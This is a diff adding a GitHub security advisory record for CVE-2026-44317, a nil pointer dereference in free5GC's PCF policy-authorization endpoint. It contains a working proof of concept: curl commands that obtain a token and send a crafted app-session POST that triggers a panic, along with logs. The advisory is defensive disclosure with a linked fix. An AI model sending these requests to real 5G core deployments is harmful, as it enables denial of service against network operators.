@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-wwqh-7jm5-gj7w",
+  "modified": "2026-05-08T22:48:38.291378Z",
+  "published": "2026-05-08T22:40:11Z",
+  "aliases": [
+    "CVE-2026-44317"
+  ],
+  "summary": "free5GC's PCF npcf-policyauthorization POST /app-sessions panics on suppFeat=1 with missing AfRoutReq via nil pointer dereference",
+  "details": "### Summary\nfree5GC's PCF `POST /npcf-policyauthorization/v1/app-sessions` handler panics on a single authenticated request whose `ascReqData.suppFeat == \"1\"` (enabling traffic-routing feature negotiation) and whose `medComponents` entries supply an `afAppId` but NO `AfRoutReq`. The create path then calls `provisioningOfTrafficRoutingInfo(smPolicy, appID, routeReq, ...)` with `routeReq == nil` and dereferences `routeReq.RouteToLocs` (and other fields) without a nil check, causing `runtime error: invalid memory address or nil pointer dereference`. Gin recovery converts the panic into `HTTP 500`.\n\nThe trigger is a single valid authenticated request -- changing only `suppFeat` from `\"0\"` to `\"1\"` flips the same shape of POST from a normal `201 Created` into a panic-driven `500`.\n\nThis endpoint requires a valid `npcf-policyauthorization` OAuth2 access token (PR:L). The PCF process is not killed (Gin recovers); the realized impact is per-request panic-DoS on the app-session create path.\n\n### Details\nValidated against the PCF container in the official Docker compose lab.\n- Source repo tag: `v4.2.1`\n- PCF endpoint: `http://10.100.200.9:8000`\n- Validation date: 2026-03-12\n\nVulnerable handler path:\n```\npostAppSessCtxProcedure\n -\u003e medComponents loop\n   -\u003e appID := medComp.AfAppId\n      routeReq := medComp.AfRoutReq   // nil when AfRoutReq absent\n      provisioningOfTrafficRoutingInfo(smPolicy, appID, routeReq, medComp.FStatus)\n```\n\nIn `provisioningOfTrafficRoutingInfo`, `routeReq.RouteToLocs`, `routeReq.UpPathChgSub`, and `routeReq.AppReloc` are dereferenced directly without a nil check. When `suppFeat` is `\"0\"` the traffic-routing branch is not entered and the same input shape returns `201 Created`; when `suppFeat` is `\"1\"` the branch is entered and the nil-deref fires.\n\nCode evidence (paths in `free5gc/pcf`):\n- Affected route + dispatch: `NFs/pcf/internal/sbi/api_policyauthorization.go`\n- Create handler path: `NFs/pcf/internal/sbi/processor/policyauthorization.go`\n- Call site that passes nil `routeReq` into the traffic-routing helper: `NFs/pcf/internal/sbi/processor/policyauthorization.go`\n- Panic site (nil deref of `routeReq.*` fields): `NFs/pcf/internal/sbi/processor/policyauthorization.go:1740`\n\n### PoC\nReproduced end-to-end against the running PCF at `http://10.100.200.9:8000`.\n\n1. Obtain a valid `npcf-policyauthorization` token from NRF:\n```\ncurl -sS -X POST 'http://10.100.200.3:8000/oauth2/token' \\\n  -H 'Content-Type: application/x-www-form-urlencoded' \\\n  --data 'grant_type=client_credentials\u0026nfType=NEF\u0026nfInstanceId=b84c4f0a-6010-4972-8480-e44e625b9ee4\u0026targetNfType=PCF\u0026scope=npcf-policyauthorization'\n```\n\n2. Trigger the panic with a single valid authenticated POST whose `ascReqData.suppFeat == \"1\"`, `medComponents` supplies `afAppId`, and `AfRoutReq` is absent:\n```\ncurl -i -X POST 'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Authorization: Bearer \u003cvalid_npcf_policyauthorization_jwt\u003e' \\\n  --data '{\"ascReqData\":{\"suppFeat\":\"1\",\"notifUri\":\"http://127.0.0.1:9999/appsess\",\"ueIpv4\":\"10.60.0.3\",\"dnn\":\"internet\",\"medComponents\":{\"1\":{\"medCompN\":1,\"afAppId\":\"app1\"}}}}'\n```\n```\nHTTP/1.1 500 Internal Server Error\n```\n\n3. Control comparison -- same request shape but `suppFeat=\"0\"` -\u003e normal `201 Created`:\n```\ncurl -i -X POST 'http://10.100.200.9:8000/npcf-policyauthorization/v1/app-sessions' \\\n  -H 'Content-Type: application/json' \\\n  -H 'Authorization: Bearer \u003cvalid_npcf_policyauthorization_jwt\u003e' \\\n  --data '{\"ascReqData\":{\"suppFeat\":\"0\",\"notifUri\":\"http://127.0.0.1:9999/appsess\",\"ueIpv4\":\"10.60.0.3\",\"dnn\":\"internet\",\"medComponents\":{\"1\":{\"medCompN\":1,\"afAppId\":\"app1\"}}}}'\n```\n```\nHTTP/1.1 201 Created\n```\n\n4. PCF container logs show the panic stack landing in `provisioningOfTrafficRoutingInfo` with `routeReq = 0x0`:\n```\n[ERRO][PCF][GIN] panic: runtime error: invalid memory address or nil pointer dereference\n  github.com/free5gc/pcf/internal/sbi/processor.provisioningOfTrafficRoutingInfo(..., 0x0, ...)\n      .../policyauthorization.go:1740\n  github.com/free5gc/pcf/internal/sbi/processor.(*Processor).postAppSessCtxProcedure\n      .../policyauthorization.go:288\n  github.com/free5gc/pcf/internal/sbi/processor.(*Processor).HandlePostAppSessionsContext\n      .../policyauthorization.go:139\n  github.com/free5gc/pcf/internal/sbi.(*Server).HTTPPostAppSessions\n      .../api_policyauthorization.go:119\n[INFO][PCF][GIN] | 500 | POST | /npcf-policyauthorization/v1/app-sessions |\n```\n\n### Impact\nNULL pointer dereference (CWE-476) caused by improper handling of an exceptional branch (CWE-754): the create path passes `routeReq` straight into `provisioningOfTrafficRoutingInfo` without a nil check, even though `medComp.AfRoutReq` is optional and is nil for the demonstrated valid input shape. The control experiment with `suppFeat=\"0\"` proves the request shape itself is otherwise valid.\n\nGin recovery catches the panic, so the PCF process is NOT killed and other endpoints continue serving. The realized impact is per-request: any authenticated POST against this endpoint with `suppFeat=\"1\"` and `medComponents.*.AfAppId` set but `AfRoutReq` absent returns `HTTP 500` with empty body and a stack trace in PCF logs.\n\nAny party that holds (or can obtain) a valid `npcf-policyauthorization` token can repeatedly drive this code path to sustain a per-request panic-DoS on the app-session create endpoint, with each panic costing more CPU + log writes than the intended controlled response would have.\n\nNo Confidentiality impact (the response is `500` with empty body). No persistent Integrity impact (the panic happens before any state mutation). Availability impact is limited to per-request degradation.\n\nAffected: free5gc v4.2.1.\n\nUpstream issue: https://github.com/free5gc/free5gc/issues/879\nUpstream fix: https://github.com/free5gc/pcf/pull/65",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/free5gc/pcf",
+        "purl": "pkg:golang/github.com/free5gc/pcf"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.4.3"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-wwqh-7jm5-gj7w/GHSA-wwqh-7jm5-gj7w.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/security/advisories/GHSA-wwqh-7jm5-gj7w"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/free5gc/issues/879"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/pcf/pull/65"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/free5gc/pcf/commit/508d70b8527a6c8c923179dad450ea01e16b6aeb"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/free5gc/free5gc"
+    }
+  ]
+}
